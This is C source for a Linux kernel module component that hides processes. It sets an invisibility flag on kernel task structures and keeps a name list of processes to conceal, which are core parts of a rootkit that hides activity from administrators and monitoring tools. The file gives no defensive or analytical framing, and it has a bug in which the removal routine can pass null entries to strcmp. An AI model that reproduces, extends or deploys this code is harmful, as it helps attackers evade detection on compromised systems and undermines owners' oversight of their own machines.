#include <proc_hiding.h>

char *hidden_procs[MAX_H_PROC];

void hide_proc(pid_t pid) {
	struct task_struct *task;

	if (pid == 0) {
		task = current;
	} else {
		task = find_task_from_pid(pid);
		if (task == NULL) {
			return;
		}
	}
	task->flags |= PF_INVISIBLE;
}
/* TODO: fix code reuse */
void show_proc(pid_t pid) {
	struct task_struct *task;

	if (pid == 0) {
		task = current;
	} else {
		task = find_task_from_pid(pid);
		if (task == NULL) {
			return;
		}
	}
	task->flags &= (~PF_INVISIBLE);

}

void init_hidden_procs(void) {
	int i = 0;
	while (i < MAX_H_PROC) {
		hidden_procs[i] = NULL;
		i++;
	}
}

void add_hidden_proc(char *name) {
	int i = 0;
	while (i < MAX_H_PROC) {
		if (hidden_procs[i] == NULL) {
			hidden_procs[i] = kstrdup(name, GFP_KERNEL);
			/* return either on success or out of memory */
			return;
		}
		i++;
	}
	return;
}

void remove_hidden_proc(char *name) {
	int i = 0;
	while (i < MAX_H_PROC) {
		if (strcmp(name, hidden_procs[i]) == 0) {
			kfree(hidden_procs[i]);
			hidden_procs[i] = NULL;
		}
		i++;
	}
	return;
}

int is_proc_hidden(char *name) {
	int i = 0;
	while (i < MAX_H_PROC) {
		if (hidden_procs[i] == NULL) {
			i++;
			continue;
		}

		if (strstr(hidden_procs[i], name) != NULL) {
			return 1;
		} 
		i++;
	}
	return 0;
}

void show_hidden_procs(void) {
	int i = 0;
	while (i < MAX_H_PROC) {
		if (hidden_procs[i] == NULL) {
			i++;
			continue;
		}

		printk(KERN_INFO "HIDDEN PROC: %s", hidden_procs[i]);
		i++;
	}
	return;
}